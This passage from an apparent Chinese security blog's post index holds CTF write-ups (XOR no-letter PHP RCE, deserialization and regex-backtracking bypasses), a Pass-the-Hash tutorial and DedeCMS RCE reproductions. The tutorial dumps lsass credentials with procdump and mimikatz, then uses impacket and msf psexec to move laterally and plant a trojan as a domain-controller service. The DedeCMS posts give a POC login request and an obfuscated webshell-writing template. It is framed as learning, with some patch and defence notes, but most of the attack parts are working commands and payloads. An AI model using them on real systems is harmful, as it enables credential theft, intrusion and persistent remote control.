&#125;&#125;if(isset($_GET[&#x27;p&#x27;]))&#123; if (preg_match(&quot;/n|c/m&quot;,$_GET[&#x27;p&#x27;], $matches)) die(&quot;no&quot;); call_user_func($_GET[&#x27;p&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125; 访问一下hint2.php，提示类是nss2 静态方法访问类成员这里的call_user_func函数：把第一个参数作为回调函数调用php是不分大小写的，所以这里可以用大小写绕过，所以这里的payload为： 1p=Nss2::Ctf NSSCTF&#123;51074e32-f061-40f1-b3e3-f06b517f69f9&#125;这里还可以用数组绕过 1p[]=nss2&amp;p[]=ctf [SWPUCTF 2022 新生赛]js_sign查看源代码 12345678document.getElementsByTagName(&quot;button&quot;)[0].addEventListener(&quot;click&quot;, ()=&gt;&#123; flag=&quot;33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15&quot; if (btoa(flag.value) == &#x27;dGFwY29kZQ==&#x27;) &#123; alert(&quot;you got hint!!!&quot;); &#125; else &#123; alert(&quot;fuck off !!&quot;); &#125; &#125;) tapcode敲击码解码提示tapcode是敲击码用在线网站解密一下，记得去掉空格3343431344215434452124331421311122125444113513341415NSSCTF&#123;youfindflagbytapcode&#125; [HUBUCTF 2022 新生赛]HowToGetShell1234567&lt;?phpshow_source(__FILE__);$mess=$_POST[&#x27;mess&#x27;];if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123; die(&quot;invalid input!&quot;);&#125;eval($mess); 无字符RCE–异或看到正则匹配就知道是无字符RCE看下笔记可以用取反，异或，自增绕过。这里用异或绕过POST传参mess=$_=(&#39;%01&#39;^&#39;%60&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%05&#39;^&#39;%60&#39;).(&#39;%09&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7c&#39;);$__=&#39;_&#39;.(&#39;%07&#39;^&#39;%40&#39;).(&#39;%05&#39;^&#39;%40&#39;).(&#39;%09&#39;^&#39;%5d&#39;);$___=$$__;$_($___[_]);对这段payload的理解为：(&#39;%01&#39;^&#39;%60&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%05&#39;^&#39;%60&#39;).(&#39;%09&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7c&#39;);$__=&#39;_&#39;.(&#39;%07&#39;^&#39;%40&#39;).(&#39;%05&#39;^&#39;%40&#39;).(&#39;%09&#39;^&#39;%5d&#39;);$___=$$__;构造函数assert($_GET[_]); 然年$_($___[_])这里调用函数然后GET传参?_=phpinfo();还可以构造POST传参的直接POST传参mess=$_=(&#39;%40&#39;^&#39;%21&#39;).(&#39;%7B&#39;^&#39;%08&#39;).(&#39;%7B&#39;^&#39;%08&#39;).(&#39;%7B&#39;^&#39;%1E&#39;).(&#39;%7E&#39;^&#39;%0C&#39;).(&#39;%7C&#39;^&#39;%08&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;%5D&#39;).(&#39;%0F&#39;^&#39;%40&#39;).(&#39;%0E&#39;^&#39;%5D&#39;).(&#39;%0B&#39;^&#39;%5F&#39;);$___=$$__;$_($___[_]);&amp;_=phpinfo();，然后搜索可得flagNSSCTF&#123;33296b7a-7b34-4eaa-a8e5-8ae3db34fba5&#125; [SWPUCTF 2022 新生赛]ez_ez_unserialize12345678910111213141516171819202122232425&lt;?phpclass X&#123; public $x = __FILE__; function __construct($x) &#123; $this-&gt;x = $x; &#125; function __wakeup() &#123; if ($this-&gt;x !== __FILE__) &#123; $this-&gt;x = __FILE__; &#125; &#125; function __destruct() &#123; highlight_file($this-&gt;x); //flag is in fllllllag.php &#125;&#125;if (isset($_REQUEST[&#x27;x&#x27;])) &#123; @unserialize($_REQUEST[&#x27;x&#x27;]);&#125; else &#123; highlight_file(__FILE__);&#125; 这里的__wakeup魔术方法，会给我们的参数赋值，所以我们需要绕过他，然后这个给x赋值flag所在的文件 __wakeup的绕过所以poc为 12345678&lt;?phpclass X&#123; public $x=fllllllag.php;&#125;$qw = new X;$qw -&gt; x = &#x27;fllllllag.php&#x27;;$wq = serialize($qw);echo ($wq); 得到payload为O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;这里如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。所以最后的payload为?x=O:1:&quot;X&quot;:3:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;NSSCTF&#123;a2ffe11f-a95a-49ce-abf0-185b52ab7cc1&#125; [NISACTF 2022]middlerce1234567891011121314151617&lt;?phpinclude &quot;check.php&quot;;if (isset($_REQUEST[&#x27;letter&#x27;]))&#123; $txw4ever = $_REQUEST[&#x27;letter&#x27;]; if (preg_match(&#x27;/^.*([\\w]|\\^|\\*|\\(|\\~|\\`|\\?|\\/| |\\||\\&amp;|!|\\&lt;|\\&gt;|\\&#123;|\\x09|\\x0a|\\[).*$/m&#x27;,$txw4ever))&#123; die(&quot;再加把油喔&quot;); &#125; else&#123; $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;]; checkdata($command); @eval($command); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 这里看到我们最后要执行命令，正则绕过了很多字符，这个正则表达式模式将匹配一个字符串，并且要求该字符串包含字母、数字、下划线或特定的特殊字符。具体来说，它可以匹配包含以下字符之一的字符串：字母、数字、还有那些字符。json_decode() 函数用于将 JSON 格式的字符串转换为 PHP 对象或关联数组。这里要绕过两个地方，第一个是绕过正则表达式，第二个是未知的checkdata函数 PCRE回溯次数限制绕过+php短标签https://www.freebuf.com/articles/web/190794.html、 简单来说，就是我们正则的回溯次数大于100万次，reg_match 返回的非 1 和 0，而是 false。 利用爆破得出checkdata函数绕过了 1assert、flag、cat、tac、php 所以我们RCE的命令为?&gt;&lt;?= tail /f*?&gt; 这里的&lt;?=?&gt;则是利用短标签，相当于&lt;? echo&gt;，?&gt;用于在eval函数时进行闭合，方便我们使用短标签来echo输出结果，反引号用来执行命令。所以最后的脚本为 12345import requestspayload=&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27; + &quot;#&quot;*(1000000) + &#x27;&quot;&#125;&#x27; # &#x27;@&#x27;*(1000000) 就是将 @ 字符串重复 1000000 次res = requests.post(&quot;http://node4.anna.nssctf.cn:28922/&quot;, data=&#123;&quot;letter&quot;:payload&#125;)print(res.text) flag为NSSCTF&#123;b305b11e-c003-42a4-9c10-dc6a1e282a1c&#125;","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"域渗透横向移动--pass the hash","slug":"PTH","date":"2024-01-12T04:42:44.700Z","updated":"2024-01-12T04:58:13.641Z","comments":true,"path":"2024/01/12/PTH/","link":"","permalink":"https://qingwan.top/2024/01/12/PTH/","excerpt":"hash传递攻击的相关手法、防御措施及其绕过","text":"hash传递攻击的相关手法、防御措施及其绕过 “Pass the Hash” 攻击是一种通过窃取用户密码的哈希值，而无需获取实际密码的攻击手法。在 Windows 系统中，用户密码通常以哈希值的形式存储，而攻击者可以直接传递这个哈希值来完成认证，绕过传统的口令验证。这种攻击的产生与弱口令、哈希值存储、以及对密码的哈希而非明文存储等因素有关。攻击者利用这一漏洞绕过身份验证，获取对系统和网络资源的访问权限，可能导致敏感信息泄漏和系统被滥用。通过PTH，可以扩大攻击范围，达到横向移动的目的。 哈希传递攻击的前提是域内主机的域管理员密码都为相同的密码，相同的密码对应的哈希值也相同。所以，如果我们拿到另一台主机的本地管理员权限，即使不知道域管理员的密码，也可以用哈希传递来获得管理员权限。 前言在开始分析PTH之前，我们先来思考几个问题： 为什么使用PTH，发明这个攻击手法的原因和目的是什么呢？①首先我们知道，如果获取了明文密码，那我们就可以直接用明文密码进行登录。但是从 Windows Server 2012 r2开始， lsass.exe进程中抓不到明文密码了。微软为了防止用户密码在内存中以明文形式泄露，发布了补丁KB2871997，关闭了Wdigest功能。使攻击者无法从内存中获取明文密码。Windows Server2012以下版本，如果安装了KB2871997补丁，攻击者同样无法获取明文密码。而且安装了 KB2871997补丁，不仅无法dump出明文密码，并且一般情况下无法使用哈希传递攻击。仅可以使用SID&#x3D;500的用户进行哈希传递攻击，而SID&#x3D;500的用户默认为administrator。②可能还会有人有疑问，我们可以使用hash爆破啊。大家都知道windows的认证hash从开始到现在大概分为LM hash和NTLM hash两种。前期的LM hash位数较少，加密方法较简单，我们可以使用爆破试一试。但是从windows 7开始 LM hash就已经被禁用了，普遍使用的是NTLM hash，这种hash使用单向MD4函数穷举，加密方法较复杂，爆破难度大。 在Windows Server 2012 或者安装了KB2871997补丁之后，就真的不能捕获到明文密码了么？答案是否定的。那我们该怎么在有这个补丁的情况下获得明文密码呢呢？更新KB2871997补丁后，Wdigest Auth强制系统的内存不再保存明文口令.但是在实际情况中一些系统服务(例如IIS的SSO身份验证、远程桌面服务)在运行的过程中需要Wdigest Auth开启，所以补丁虽然强制关闭Wdigest Auth，但是我们可以选择是否禁用Wdigest Auth。我们可以先来了解一下，什么是Wdigest Auth Wdigest Auth（Windows Digest Authentication）是 Windows 操作系统中的一种身份验证协议，用于通过摘要（digest）方式进行用户身份验证。该协议的主要目的是增强传统的 NTLM（NT LAN Manager）身份验证的安全性。在 Wdigest Auth 中，用户的密码不会以明文形式在网络上传输。相反，系统会使用一种摘要算法，将密码的摘要信息传递给服务器。这样，即使在网络上截获了数据包，攻击者也难以还原出用户的明文密码。 这里Wdigest Auth 的开启与关闭涉及 Windows 操作系统中 LSA（Local Security Authority，本地安全性机构）的策略，其中的一个重要参数是 UseLogonCredential。 如果 UseLogonCredential 为 1，表示开启 Wdigest Auth，此时系统会在内存中保存用户的明文口令。 如果 UseLogonCredential 为 0，表示关闭 Wdigest Auth，此时系统在内存中不再保存用户的明文口令。 这里一下说用户的密码不会以明文形式在网络上传输，一下又说此时系统会在内存中保存用户的明文口令，是否冲突呢？其实不然，这两句话在描述 Wdigest Auth 的不同方面。 “在 Wdigest Auth 中，用户的密码不以明文形式在网络上传输。” 这句话强调了 Wdigest Auth 的网络传输安全性。即使攻击者截获了网络数据包，由于使用了摘要算法，攻击者很难还原出用户的明文密码。 “如果 UseLogonCredential 为 1，表示开启 Wdigest Auth，此时系统会在内存中保存用户的明文口令。” 这句话描述了 Wdigest Auth 在系统内存中的行为。如果 UseLogonCredential 为 1，系统将保存用户的明文口令以支持 Wdigest Auth 过程。这是为了在用户的会话期间（例如，单一登录或其他服务需要明文密码的情况）提供更高的效率和功能。Wdigest Auth 通过在网络上传输时使用摘要算法，保护了密码的传输安全性，而在内存中保存用户的明文口令则是为了提供在用户会话期间的便利性和功能。 那这里我们就来实验一下吧，我用域内的windows server 2016作为实验机器我们先看一下UseLogonCredential 这个参数有没有打开 1234567将下列注册表路径的HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest以下项的UseLogonCredential值修改成0或10：关闭Wdigest Auth1：启动Wdigest Auth 我们来修改下windows server 2016的注册表，我手动找没有找到UseLogonCredential 这个参数，但是输入下面这个命令可以执行成功，修改之后，将用户administrator注销，然后重新登录 1reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 然后再输入，记得要把病毒防护和防火墙关掉 1procdump64.exe -accepteula -ma lsass.exe lsass.dmp 然后在放在同一目录下执行，记得都要把防火墙和病毒防护全部关掉！！！然后记住要管理员身份运行 123sekurlsa::minidump lsass.dmpprivilege::debug //提权 sekurlsa::logonpasswords //这个命令如果执行的时候报错，可以多执行几次 在没有开启前，我们抓到的密码是hash值 然后在修改之后重新登录得到明文密码 PTH在什么情况下可以用？在上面一个问题里面，我们提到了2014年微软发布了补丁KB2871997，那么这个补丁真的可以防御PTH么？更新KB2871997后，发现无法使用常规的哈希传递方法进行横向移动，但Administrator账号(SID为500)，使用该账号的散列值依然可以进行哈希传递。 在工作组环境中： Windows Vista 之前的机器，可以使用本地管理员组内的用户进行攻击。 Windows Vista 之后的机器，只能是sid&#x3D;500的用户的哈希值才能进行哈希传递攻击在域环境中： 域管理员组内用户的哈希值能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。但是在打了补丁之后，也只有sid&#x3D;500的用户才能进行PTH 那怎么判断当前机器是在域内还是在工作组内呢①查看此电脑的属性选择高级系统设置查看如果是域则代表是域环境，如果是工作组则代表是工作组内②输入systeminfo显示出计算机的操作系统的详细配置信息然后看域这栏是否为空，如果不为空，则在域内 如果我们拿下的这台机器上没有域管的hash怎么办呢？一般得域管登录过我们的机器，我们才能在机器上抓到其hash。但实际上一个域内可能有几百几千台机器，不一定我们拿下的那台机器就有域管的hash。那这时候我们应该怎么办呢？我们一般会先在拿下的这台主机上提权到sid&#x3D;500的管理员用户，然后用域内用户的hash横向移动到其他机器，直到获取到域管的hash为止。但是一般都不会那么容易获取到，都会有防御措施。这时候我们就会用其他横向移动的方法，或者去打一些其他的服务。 复现环境域控：windows server 2016域内主机：windows 10攻击机：kali 在域内进行PTH的前提是： 1.获得一台域主机的权限2.Dump内存获得其hash3.通过PTH尝试登录其他主机4.直到获得域管理员账户hash，登录域控，最终成功控制整个域 PTH攻击实例这里假设我们已经拿下了windows 10，我们就在这台机器上进行PTH攻击因为win10和我的攻击机不在同一个局域网内，所以我这里先代理一下，使得攻击机和win10之间可以相互通信这里记得要把主机和win10的防火墙都关了 ①猕猴桃这里注意ntlm hash dump出来可能有好几个hash，就是登陆过这个计算机的都会有，这里如果实在不知道哪个是域控的，可以都试试，这里记得用管理员权限执行猕猴桃 1234567891011121314privilege::debugsekurlsa::pth /user:administrator /domain:WANYUE /ntlm:cb0a99e1c922b84b1b632df155665470dir \\\\DC01\\c$ //DC01为主机名，通过hostname查看，这里为域控的主机名，这个命令会列举域控的C盘下的目录为了进一步扩大战果，我们还可以把木马上传到域控下copy hack.exe \\\\DC01\\c$ //上传木马hack.exe到域控的C盘下//在域控上创建服务启动木马sc \\\\[computer&#x27;s name.domain name] create [service name] binpath=&quot;[file path]&quot;如：sc \\\\DC01.wanyue.com create update binpath= &quot;c:\\hack.exe&quot;sc \\\\DC01.wanyue.com start update // 在域控上立即启动该服务sc \\\\DC01.wanyue.com delete update // 在域控上立即删除该服务或者直接连接域控,在本地计算机上创建一个网络驱动器z:映射到域控的c:。net use z: \\\\192.168.0.1\\c$ 成功之后会弹出一个弹窗，在弹窗输入命令执行即可 ②impacket一般都是在本地打 wmiexec（比psexec隐蔽,使用wmiexec进行横向移动的时候，Windows操作系统默认不会将WMI的操作记录在日志中） 12wmiexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;如：python wmiexec.py -hashes &quot;:cb0a99e1c922b84b1b632df155665470&quot; wanyue/administrator@192.168.0.1 注意要把防火墙关了 atexec12atexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt; &quot;command&quot;如：python atexec.py -hashes &quot;:cb0a99e1c922b84b1b632df155665470&quot; wanyue/administrator@192.168.0.1 whoami psexec psexec远程运行需要远程计算机启用文件和打印共享且默认的Admin$共享映射到C:windows目录。 psexec建立连接之后目标机器上会被安装一个PSEXESVC服务。但是psexec安全退出之后这个服务会自动删除（在命令行下使用exit命令退出） exe版的似乎没有-hashes这个参数，所以只能用明文密码 1PsExec64.exe \\\\192.168.0.1 -u administrator -i -p Admin111 cmd 还有py版的 12psexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;如：python psexec.py wanyue/administrator@192.168.0.1 -hashes &quot;:cb0a99e1c922b84b1b632df155665470&quot; ③利用msf的psexec模块12345use exploit/windows/smb/psexec_pshset smbdomain 域名set smbuser usernmaeset smbpass passwordrun （这个没有实验过，在set smbpass password，这个命令里的password似乎可以用hash值代替，还有CS也可以PTH） ④利用wmiexec.exe下载地址：https://github.com/maaaaz/impacket-examples-windows 1wmiexec.exe -hashes &quot;:cb0a99e1c922b84b1b632df155665470&quot; WANYUE/Administrator@192.168.0.1 &quot;dir&quot; PTH攻击的防御目前还没有完全可以防御PTH的手法，要使得不被PTH攻击的第一步就是避免攻击者获得自身主机hash值。 打补丁其实是防御的一个好方法，虽然并不能完全防御，但是一般权限的用户就不能PTH了。记住就算打了补丁也要记得把sid=500的管理员账户禁用了。 KB2871997补丁的特点参考链接：https://blog.csdn.net/ping_pig/article/details/121228950、https://www.freebuf.com/column/220740.html 注意：安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存不保存明文的密码。 ① 支持受保护用户组 Protected Users组是一个新的域全局安全组，所属用户会被强制要求使用Kerberos认证，可以避免PTH攻击。注意：真正影响PTH的因素是UAC。 ② 远程桌面客户端支持 Restricted Admin RDP 模式 受限管理员模式能够避免发送明文，服务端也不会缓存用户凭据，但是这种方式也可以增加了新的攻击路径，即可以以pth的方式向远处桌面服务器发起认证。 ③ LSA 凭据清理和其他更改 从 LSASS 中删除明文凭据 用户注销后，凭据将始终从内存中清除 具体更改为： 1、 支持“ProtectedUsers”组； 2、 Restricted Admin RDP模式的远程桌面客户端支持； 3、 注销后删除LSASS中的凭据； 4、 添加两个新的SID； 5、 LSASS中只允许wdigest存储明文密码。 那在打了补丁之后对PTH的防御方法就有: 1、 将FilterAdministratorToken的值设置为1，限制本地administrator账户的远程； 2、 可以使用脚本或者人工定时查看LocalAccountTokenFilterPolicy是否曾经被攻击者修改过； 3、 在组策略中的“拒绝从网络访问这台计算机”将需要限制的组、用户加入到列表中。","categories":[{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"Qingwan"},{"title":"DedeCMS远程代码执行复现 （CVE-2022-35516）","slug":"DedeCMS远程代码执行复现 （CVE-2022-35516）","date":"2024-01-08T07:50:31.021Z","updated":"2024-01-08T07:54:08.839Z","comments":true,"path":"2024/01/08/DedeCMS远程代码执行复现 （CVE-2022-35516）/","link":"","permalink":"https://qingwan.top/2024/01/08/DedeCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%20%EF%BC%88CVE-2022-35516%EF%BC%89/","excerpt":"Dedecms框架漏洞复现⑤","text":"Dedecms框架漏洞复现⑤ 漏洞影响范围dedecms 5.7.93 - 5.7.96 漏洞分析DedeCMS v5.7.93在/dede/login. php文件中增加了登录失败锁功能，以符合相关的Web安全法规。当用户登录失败时，失败消息将写入文件/data/login.data.php，以记录该用户登录失败的次数。 我们看下login.php的关键代码，在我们登录的时候并没有验证用户名，就直接写入了文件这里我们看到，如果我们连续登录失败，会将 $arr_login 在 json_encode 后写入文件/data/login.data.php中，写入内容有用户名，次数，时间，这里我们就可以通过给用户名赋值恶意代码导致RCE dedecms 会对进入程序的所有变量进行一次过滤，比如这里的 $userid，过滤的具体代码位于 /include/common.inc.php这里对变量使用了addslashes() 函数，按理来说我们写入了&#39;;phpinfo();?&gt; 存到文件中之后，会转变成 \\&#39;;phpinfo();?&gt;，这样我们的&#39;就被转义了，就无法闭合之前的单引号。但是这里的问题出在我们的登录信息存到文件中的时候是经过json_encode的，json_encode 会转义 /\\ 等字符。所以最后变成了&#39;;phpinfo();?&gt; -&gt; \\&#39;;phpinfo();?&gt; -&gt; \\\\&#39;;phpinfo();?&gt;这里又将转义字符转义回去了，所以我们的&#39;也会起到转换的作用，进而闭合，进行RCE 漏洞复现访问登录页面，然后输入用户名&#39;;phpinfo();?&gt;&#39; 我在登录第二次的时候，就看到闪过了phpinfo的界面 我们发现在网站目录下确实生成了login.data.php&#96;这个文件访问一下这个文件所以POC为 123456POST /dede/login.php HTTP/1.1Host: dedecms5793Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=e9ag7oevkh77gnko3cdmt7mbc2dopost=login&amp;userid=%5C%27.phpinfo%28%29%3B%3F%3E&amp;pwd=1234&amp;validate=hw0k 修补方法在 5.7.97 中， login.php 中对应的代码变成了下面这样此处添加了$res==-1这个比较，就要求我们登录的用户名必须是经过注册了的，如果不存在，将会直接退出而不会写入文件中这里修复之后其实还可以进行绕过，详细可以看这篇文章 思考 这里由于单引号和双引号的作用，比如我们想执行whoami命令，我们就不能使用system(&#39;whoami&#39;);这些命令执行的函数了，因为他们写到文件里面之后会变成 system(\\\\&#39;whoami\\\\&#39;);，这时候会进行报错，因为我们不能在函数的头尾的单引号上面使用转义。那这样的话，我们有什么办法去使用我们的函数去执行命令呢 这里就可以使用一些ctf中常见的绕过手法了 回答：①使用反引号 比如 12345echo `whoami`;&#x27;;echo `whoami`;?&gt; //输入的用户名echo `dir`;&#x27;;echo `dir`;?&gt; ②chr()函数+连接符. 12system(chr(119) . chr(104) . chr(111) . chr(97) . chr(109) . chr(105));&#x27;;system(chr(119).chr(104).chr(111).chr(97).chr(109).chr(105));?&gt; //用户名 ③括号(绕过 12(sy.(st).em)(whoami);&#x27;;(sy.(st).em)(whoami);?&gt; //用户名 框架中还有没有其他的地方有类似的写法 回答：目前没有发现","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[],"author":"Qingwan"},{"title":"DedeCMS v5.7.105 -- RCE复现","slug":"DedeCMS v5.7.105 -- RCE复现","date":"2024-01-08T07:44:46.689Z","updated":"2024-01-08T07:54:14.768Z","comments":true,"path":"2024/01/08/DedeCMS v5.7.105 -- RCE复现/","link":"","permalink":"https://qingwan.top/2024/01/08/DedeCMS%20v5.7.105%20--%20RCE%E5%A4%8D%E7%8E%B0/","excerpt":"Dedecms框架漏洞复现④","text":"Dedecms框架漏洞复现④ 环境搭建漏洞影响版本： &lt;&#x3D;DedeCMS v5.7.105下载dedecms v5.7.105版本或其以下的源码（可以去官网或者GitHub上下载）这里我用的就是5.7.105版本的然后用phpstudy搭建环镜 漏洞复现搭建好环境之后 注册一个账号 然后登录后台第一步，按照下面步骤新建一个模板在下方的框里写上如下内容 123&lt;?php&quot;\\x66\\x69\\x6c\\x65\\x5f\\x70\\x75\\x74\\x5f\\x63\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x73&quot;(&#x27;./shell.php&#x27;, &quot;&lt;?php eva&quot; . &quot;l(\\$_GE&quot; . &quot;T[a]);&quot;);// file_put_contents(&#x27;./shell.php&#x27;, &quot;&lt;?php eval($_GET[a]);&quot;); 第二步，按照下面步骤新建一个页面这里新建页面的时候，主要注意的就是那个文件名的后缀要写成..php，然后模板文件名那里的htm文件，写之前新建模板里的htm（是否编译那里是或者否都可以）这里会把htm文件里的内容写入到新建的php文件里然后访问 1http://localhost/DedeCMS-V5.7.105-UTF8/uploads/a/1.php 此时会在a目录下生成一个shell.php文件内容为: 1&lt;?php eval($_GET[a]);&quot;); 然后测试一下 1http://localhost/DedeCMS-V5.7.105-UTF8/uploads/a/shell.php?a=phpinfo(); 成功利用再测测，确实没问题 漏洞成因分析首先我们看到创建模板页面，看到创建模板的接口调用的是是tpl.php文件 uploads&#x2F;dede&#x2F;tpl.php文件，截取主要的部分然后加了一些注释 12345678910111213141516171819202122232425262728293031323334353637383940414243/* (/\\*)[\\s\\S]*(\\*/)#i 是一个正则表达式模式，表示要匹配的内容。 其中，/\\*和 \\*/表示分别匹配开头的 &quot;/&quot; 和结尾的 &quot;/&quot; 符号，[\\s\\S]* 表示匹配任意空白字符或非空白字符，i 表示忽略大小写。 这个正则表达式的作用是查找 $content 变量中所有以 &quot;/&quot; 开头、以 &quot;/&quot; 结尾的注释，并将其替换为空字符串。这样可以从文本中删除所有的注释内容。 */$content = preg_replace(&quot;#(/\\*)[\\s\\S]*(\\*/)#i&quot;, &#x27;&#x27;, $content);// 黑名单正则匹配，禁了下面这些函数global $cfg_disable_funs;$cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : &#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace&#x27;;$cfg_disable_funs = $cfg_disable_funs.&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;;foreach (explode(&quot;,&quot;, $cfg_disable_funs) as $value) &#123; //将 `$value` 变量中的所有空格字符（包括空格、制表符和换行符等）都删除。 $value = str_replace(&quot; &quot;, &quot;&quot;, $value); /* 该表达式的作用是：如果 `$value` 不为空，并且 `$content` 中存在任意非小写字母字符后跟着 `$value` 的单引号 或双引号，然后紧接着零个或多个空格字符和左括号（圆括号、方括号、大括号）时，则条件成立，即字符串匹 配指定的正则表达式。 */ if(!empty($value) &amp;&amp; preg_match(&quot;#[^a-z]+[&#x27;\\&quot;]*&#123;$value&#125;[&#x27;\\&quot;]*[\\s]*[([&#123;]#i&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123; $content = dede_htmlspecialchars($content); die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;); &#125; &#125; /* 如果 `$content` 的开头部分包含 &quot;&lt;?&quot;、&quot;&lt;?php&quot; 或 &quot;&lt;?=&quot; 等 PHP 代码标识符，并且标识符后跟着一个或多个空 白字符，则条件成立。即就是匹配php代码的头 */ if(preg_match(&quot;#^[\\s\\S]+&lt;\\?(php|=)?[\\s]+#i&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123; // 这里的U为惰性匹配 // 匹配函数变量执行，例如$a=&quot;phpinfo&quot;，则$a()就会被匹配 if(preg_match(&quot;#[$][_0-9a-z]+[\\s]*[(][\\s\\S]*[)][\\s]*[;]#iU&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123; $content = dede_htmlspecialchars($content); die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;); &#125; // 就是在上一个匹配前加了一个@，防止报错 if(preg_match(&quot;#[@][$][_0-9a-z]+[\\s]*[(][\\s\\S]*[)]#iU&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123; $content = dede_htmlspecialchars($content); die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;); &#125; // 匹配反引号`，防止命令执行 if(preg_match(&quot;#[`][\\s\\S]*[`]#i&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123; $content = dede_htmlspecialchars($content); die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;); &#125; &#125; 然后这些过滤不算很严格，我们还是有很多方法可以去绕过的，比如我们上面的漏洞复现的时候写入的代码就可以绕过这些限制然后看到编辑模板的地方可以看到这里要求我们的模板结尾必须是.htm，而且还将一些表单标签的关键字进行了替换 12345678910111213141516171819202122232425else if($action == &#x27;saveedit&#x27;) &#123; csrf_check(); if($filename == &#x27;&#x27;) &#123; ShowMsg(&#x27;未指定要编辑的文件或文件名不合法&#x27;, &#x27;-1&#x27;); exit(); &#125; if(!preg_match(&quot;#\\.htm$#&quot;, $filename)) &#123; ShowMsg(&#x27;DEDE模板文件，文件名必须用.htm结尾！&#x27;, &#x27;-1&#x27;); exit(); &#125; $content = stripslashes($content); $content = preg_replace(&quot;/##textarea/i&quot;, &quot;&lt;textarea&quot;, $content); $content = preg_replace(&quot;/##\\/textarea/i&quot;, &quot;&lt;/textarea&quot;, $content); $content = preg_replace(&quot;/##form/i&quot;, &quot;&lt;form&quot;, $content); $content = preg_replace(&quot;/##\\/form/i&quot;, &quot;&lt;/form&quot;, $content); $truefile = $templetdird.&#x27;/&#x27;.$filename; $fp = fopen($truefile, &#x27;w&#x27;); fwrite($fp, $content); fclose($fp); ShowMsg(&#x27;成功修改或新建文件&#x27;, &#x27;templets_main.php?acdir=&#x27;.$acdir); exit(); &#125; 然后看到新建页面的源码templets_one_add.php前面都是在对新建页面的内容进行一个处理，我们在新建页面的时候并没有另外写内容，所以前面都不用管，我们看到这里对新建页面进行了一个保存那我们就来到uploads/include/arc.sgpage.class.php的SavaToHtml方法。这个函数主要作用是将当前对象的内容保存为HTML文件。然后进入uploads/include/dedetag.class.php的SaveTo方法，这个函数的作用是将替换后的字符串保存到指定的文件中，即获取文件内容。最后看到GetResult方法，这个方法用于替换模板内容中的字符串，即将一个字符串中的特定标签替换为对应的值，然后返回替换后的字符串。这个漏洞的成因简单来说，就是没有对用户新建的文件的名字是否合法做出判断，而且对文件内容的过滤也不完全，所以导致用户可以通过恶意输入进行利用。","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[],"author":"Qingwan"},{"title":"DedeCMS v5.7 SP2后台文件上传getshell（CVE-2019-8362）","slug":"DedeCMS v5.7 SP2后台文件上传getshell（CVE-2019-8362）","date":"2024-01-08T07:41:22.038Z","updated":"2024-03-06T10:18:00.566Z","comments":true,"path":"2024/01/08/DedeCMS v5.7 